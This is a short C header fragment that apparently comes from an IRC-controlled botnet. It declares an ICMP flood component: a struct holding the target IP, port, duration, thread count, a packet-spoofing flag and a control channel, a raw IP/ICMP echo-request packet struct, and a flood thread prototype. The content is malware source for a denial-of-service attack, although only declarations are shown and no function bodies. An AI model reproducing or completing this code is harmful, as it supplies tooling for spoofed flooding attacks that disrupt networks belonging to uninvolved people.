

#ifndef NO_ICMP
typedef struct ICMPFLOOD {

	SOCKET sock;
	char ip[128];
	char type[128];
	char chan[128];
	int threadnum;
	int port;
	int time;
	BOOL spoof;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} ICMPFLOOD;

typedef struct ECHOREQUEST
{
	IPHEADER ipHeader;
    ICMPHEADER icmpHeader;
    char cData[1024];

} ECHOREQUEST;


DWORD WINAPI ICMPFloodThread(LPVOID param);
#endif